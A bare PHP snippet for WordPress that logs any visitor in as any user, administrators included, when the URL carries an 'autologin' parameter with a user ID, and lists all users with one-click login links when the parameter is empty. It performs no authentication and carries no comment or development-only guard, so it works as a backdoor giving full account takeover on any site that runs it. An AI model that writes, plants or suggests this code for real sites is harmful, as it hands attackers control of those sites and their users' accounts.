<?php

if (isset($_GET['autologin'])) { add_action('init', function() { if ($user_id = $_GET['autologin']) { $user = get_user_by('id', $user_id); $user = $user->data; wp_set_current_user($user_id, $user->user_login); wp_set_auth_cookie($user_id); do_action('wp_login', $user->user_login, $user); wp_redirect(admin_url()); } else { foreach(get_users() as $user) { echo "<div><a href='?autologin={$user->ID}'>{$user->data->display_name}</a></div>"; } die; } }); }
